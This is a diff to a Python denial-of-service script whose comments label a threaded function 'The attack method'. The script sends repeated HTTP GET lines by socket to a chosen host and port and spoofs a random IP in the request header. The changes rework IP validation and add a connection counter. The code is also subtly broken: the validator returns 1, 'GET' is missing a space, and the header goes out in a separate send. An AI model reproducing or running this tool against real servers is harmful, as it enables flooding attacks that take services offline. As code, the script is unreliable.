@@ -8,7 +8,8 @@ import random
 # Function to define the IP address type
 def ip_address(ip):
     try:
-        return ipaddress.ip_address(ip)
+        ipaddress.ip_address(ip)
+        return 1
     except ValueError:
         raise argparse.ArgumentTypeError(f"Invalid IP address {ip}")
 
@@ -25,9 +26,11 @@ args = parser.parse_args()
 # Generating a random ip address for spoofing
 if args.spoof:
     fip = f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
-    fip = ip_address(fip)
 else:
     print('[-] Warning: Using your IP address in the request headers. Use -s to spoof your IP.')
+
+# Keep track of connected threads
+ac = 0
 
 
 # The attack method
@@ -38,7 +41,10 @@ def attack():
         s.sendto(("GET" + args.destination + " HTTP/1.1\r\n").encode('ascii'), (args.destination, args.port))
         s.sendto(("Host: " + fip + "\r\n\r\n").encode('ascii'), (args.destination, args.port))
         s.close()
-        print("[+] Connected\t")
+        global ac
+        ac += 1
+        if ac % args.threads == 0:
+            print("[+] Connected\t")
 
 
 # Running multiple threads
